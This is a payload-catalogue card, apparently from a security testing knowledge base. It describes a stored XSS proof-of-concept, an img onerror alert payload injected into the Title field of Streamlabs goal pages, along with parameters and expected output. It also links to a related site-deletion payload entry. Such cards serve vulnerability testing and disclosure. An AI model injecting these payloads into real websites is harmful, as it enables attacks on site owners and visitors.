---
data: '"><img src=x onerror=alert()>'
tags:
  - xss
  - poc
type: command
executor: javascript
platforms:
  - Web
id: b981ffd5-173e-4529-854e-fb33255179ac
created_at: '2025-12-13T23:52:55.353Z'
updated_at: '2025-12-13T23:52:55.353Z'
verified: false
validated: true
submitted: true
---
# stored-xss-alert-payload

## Command

```javascript
"><img src=x onerror=alert()>
```

## Description

Basic stored XSS payload injected into the Title field of Streamlabs goal pages to confirm vulnerability by triggering a browser alert on render.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| src | Invalid image source to force onerror | Yes |
| onerror | JavaScript to execute on error (alert) | Yes |

## Examples

### Basic Usage

```javascript
"><img src=x onerror=alert()>
```

### Advanced Usage

Embed in larger context, e.g., title="Goal"><img src=x onerror=alert()>

## Expected Output

Browser alert popup with 'undefined' message upon page load in victim's session.

## Related

- [[commands/stored-xss-delete-site-payload]]
- [[procedures/Inject-Stored-XSS-in-Goal-Title]]
